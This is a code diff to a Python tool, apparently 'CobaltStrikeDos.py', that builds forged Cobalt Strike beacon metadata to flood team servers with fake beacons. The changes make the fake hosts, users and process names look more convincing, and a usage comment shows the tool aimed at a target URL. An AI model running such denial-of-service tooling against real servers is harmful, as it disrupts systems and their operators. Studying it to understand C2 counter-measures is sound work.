@@ -9,10 +9,9 @@ import os
 import sys
 import M2Crypto
 import pefile
-import random
 import re
 import requests, struct, urllib3
-import string
+import string,random
 import time
 import threading
 from Crypto.Cipher import AES
@@ -31,6 +30,10 @@ class Metadata(object):
     This is specific to Cobalt 4 and up
     """
 
+    def random_user():
+        users = ['Administrator','DefaultAccount','Guest','WDAGUtilityAccount','weaver','weixin']
+
+
     def __init__(self, public_key, aes_source_bytes):
         """
         Generates a random beacon entry
@@ -38,14 +41,17 @@ class Metadata(object):
             public_key (bytes): The extracted public key from beacon configuration
             aes_source_bytes (bytes): 16 bytes used to generate AES keys from
         """
+        # python3 CobaltStrikeDos.py https://x.x.x.x/ 4Ovd
         self.public_key = public_key
         self.port = random.randint(40000, 50000)
         self.ciphertext = ""
         self.charset = 20273
         self.ver = random.randint(1, 10)
         self.ip = os.urandom(4)
-        self.comp = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
-        self.user = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))
+        self.comp = "Desktop-" + ''.join(random.choices(string.ascii_uppercase+ string.ascii_lowercase + string.digits, k=7))
+        self.process = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=7)) + ".exe"
+        # self.user = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=7))
+        self.user = ''.join(random.choices(['Administrator','DefaultAccount','Guest','WDAGUtilityAccount','weaver','weixin','admin','guest','hacker','redteam','qaxnb','360nb']))
         self.pid = random.randint(1, 50000) * 4 - 2  # ;)
         self.bid = random.randint(1, 1000000) * 2
         self.barch = 1
@@ -79,7 +85,7 @@ class Metadata(object):
                                                    self.port, self.is64, self.ver) + self.junk
         data += struct.pack('4s', self.ip)
         data += b'\x00' * (51 - len(data))
-        data += '\t'.join([self.comp, self.user]).encode()
+        data += '\t'.join([self.comp, self.user, self.process]).encode()
         return self.rsa_encrypt(data)
 
 
